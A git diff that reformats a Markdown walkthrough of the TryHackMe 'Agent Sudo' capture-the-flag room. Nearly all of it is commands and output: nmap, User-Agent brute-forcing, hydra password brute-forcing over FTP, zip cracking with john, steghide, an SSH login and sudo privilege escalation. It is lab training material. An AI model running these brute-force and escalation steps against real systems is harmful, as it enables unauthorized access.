@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
 ```
+
 Room link: [https://tryhackme.com/r/room/agentsudoctf](https://tryhackme.com/r/room/agentsudoctf)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/agentsudoctf](https://tryhackme.com/r/r
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ nmap -v -sV -sC 10.10.173.162
@@ -79,7 +83,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds
 ```
+
 We have three services running:
+
 - vsftpd 3.0.3 on port 21
 - OpenSSH 7.6p1  on port 22
 - Apache httpd 2.4.29 on port 80
@@ -87,6 +93,7 @@ We have three services running:
 ### Manually browse to the web site
 
 Manually browsing to port 80 with `curl` shows the following message
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ curl http://10.10.173.162
@@ -111,6 +118,7 @@ Manually browsing to port 80 with `curl` shows the following message
 ```
 
 Let's change our [User-Agent header](https://en.wikipedia.org/wiki/User-Agent_header) and try again
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ curl -A "R" -L http://10.10.173.162 
@@ -133,9 +141,11 @@ What are you doing! Are you one of the 25 employees? If not, I going to report t
 </body>
 </html>
 ```
+
 No luck!
 
 We could try to bruteforce the agent user name (`A-Z`)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ for user in {A..Z}; do echo "---$user---"; curl -A "$user" -L http://10.10.173.162 ; done
@@ -191,11 +201,13 @@ Agent R
 <html>
 <---snip--->
 ```
+
 We found the agent name `chris`.
 
 ### Brute force chris's password for FTP
 
 Next, we check for Chris's FTP password with `hydra`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.173.162 ftp             
@@ -208,9 +220,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 16:37:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 16:38:56
 ```
+
 The password is `crystal`.
 
 Now we login with FTP and search for interesting files
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ ftp chris@10.10.173.162    
@@ -252,6 +266,7 @@ ftp> quit
 ```
 
 We read the text file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ cat To_agentJ.txt               
@@ -266,7 +281,8 @@ Agent C
 ### Extract embedded files with binwalk
 
 As hinted we search for embedded files in the pictures with `binwalk`
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ binwalk -Me cute-alien.jpg 
 
@@ -317,6 +333,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 ```
 
 We check the results
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ cd _cutie.png.extracted 
@@ -331,14 +348,18 @@ drwxrwxrwx 1 root root   4096 Sep 18 16:48 ..
 -rwxrwxrwx 1 root root    280 Sep 18 16:48 8702.zip
 -rwxrwxrwx 1 root root      0 Oct 29  2019 To_agentR.txt
 ```
+
 A zip-file called `8702.zip`. Let's try to unzip it.
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
 └─$ unzip 8702.zip                                      
 Archive:  8702.zip
    skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
 ```
+
 Nope, not new enough version. We try 7-Zip instead
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
 └─$ 7z e 8702.zip 
@@ -376,16 +397,20 @@ Archives with Errors: 1
 
 Sub items Errors: 1
 ```
+
 The zip-file is password protected.
 
 ### Crack the hash with JtR
 
 First we get the hash
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ zip2john _cutie.png.extracted/8702.zip > zip_hash.txt
 ```
+
 Next we try to crack it with the `rockyou` wordlist
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt       
@@ -399,9 +424,11 @@ alien            (8702.zip/To_agentR.txt)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
 The password is `alien`.
 
 Retry to open the zip-file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
 └─$ 7z e 8702.zip                         
@@ -447,6 +474,7 @@ Agent R
 ```
 
 The text looks Base64-encoded
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
 └─$ echo 'QXJlYTUx' | base64 -d                                                      
@@ -456,12 +484,15 @@ Area51
 ### Extract data with steghide
 
 Next, we can try to extract info from the other picture file (`cute-alien.jpg`)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ steghide extract -sf cute-alien.jpg -p Area51
 wrote extracted data to "message.txt".
 ```
+
 Check the extracted file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ cat message.txt  
@@ -474,11 +505,13 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 Your buddy,
 chris
 ```
+
 We have found another user and password.
 
 ### Login with SSH as james
 
 Now we ought to be able to login with SSH as `james`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ ssh james@10.10.173.162                               
@@ -513,6 +546,7 @@ james@agent-sudo:~$
 ### Get the user flag
 
 Let's search for the user flag
+
 ```bash
 james@agent-sudo:~$ ls -la
 total 80
@@ -535,6 +569,7 @@ b<REDACTED>7
 
 In the home directory there is another alien picture (`Alien_autospy.jpg`).  
 Let's download it with `scp`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
 └─$ scp james@10.10.173.162:Alien_autospy.jpg ./Alien_autopsy.jpg          
@@ -549,6 +584,7 @@ One of the hits is from [Fox News](https://www.foxnews.com/science/filmmaker-rev
 
 We now start enumerating for ways to escalate our privileges.  
 First we check if we can run any commands as root via `sudo`
+
 ```bash
 james@agent-sudo:~$ sudo -l
 [sudo] password for james: 
@@ -559,16 +595,19 @@ User james may run the following commands on agent-sudo:
     (ALL, !root) /bin/bash
 james@agent-sudo:~$ 
 ```
+
 We can run `/bin/bash` as `root`.
 
 The CVE for this vulnerability can be found by Googling for
-```
+
+```text
 sudo local privilege escalation cve 2019
 ```
 
 ### Get the root flag
 
 Finally we can get the root flag by using the vulnerability
+
 ```bash
 james@agent-sudo:~$ sudo -l
 [sudo] password for james: 
@@ -591,6 +630,7 @@ b<REDACTED>2
 By,
 D<REDACTED>l a.k.a Agent R
 ```
+
 And there we have the flag and Agent R's name.
 
 For additional information, please see the references below.
